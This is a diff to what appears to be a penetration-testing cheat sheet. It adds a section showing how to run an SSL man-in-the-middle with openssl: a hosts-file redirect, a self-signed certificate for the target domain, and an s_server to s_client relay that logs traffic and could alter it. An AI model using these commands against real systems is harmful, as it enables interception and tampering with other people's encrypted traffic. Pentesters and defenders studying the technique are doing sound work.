@@ -9,6 +9,7 @@
 - [Responder](#responder)
 - [Bettercap](#bettercap)
 - [Reconnoitre](#reconnoitre)
+- [SSL MITM with OpenSSL](#ssl-mitm-with-openssl)
 - [References](#references)
 
 ## Nmap
@@ -195,6 +196,23 @@ bettercap -X --proxy --proxy-https -T <target IP>
 # intercepting http and https requests,
 # targetting specific IP only
 ```
+
+## SSL MITM with OpenSSL
+This code snippet allows you to sniff/modify SSL traffic if there is a MITM vulnerability using only openssl.
+If you can modify `/etc/hosts` of the client:
+```powershell
+sudo echo "[OPENSSL SERVER ADDRESS] [domain.of.server.to.mitm]" >> /etc/hosts  # On client host
+```
+On our MITM server, if the client accepts self signed certificates (you can use a legit certificate if you have the private key of the legit server):
+```powershell
+openssl req -subj '/CN=[domain.of.server.to.mitm]' -batch -new -x509 -days 365 -nodes -out server.pem -keyout server.pem
+```
+On our MITM server, we setup our infra:
+```powershell
+mkfifo response
+sudo openssl s_server -cert server.pem -accept [INTERFACE TO LISTEN TO]:[PORT] -quiet < response | tee | openssl s_client -quiet -servername [domain.of.server.to.mitm] -connect[IP of server to MITM]:[PORT] | tee | cat > response
+```
+In this example, traffic is only displayed with `tee` but we could modify it using `sed` for example.
 
 ## References
 
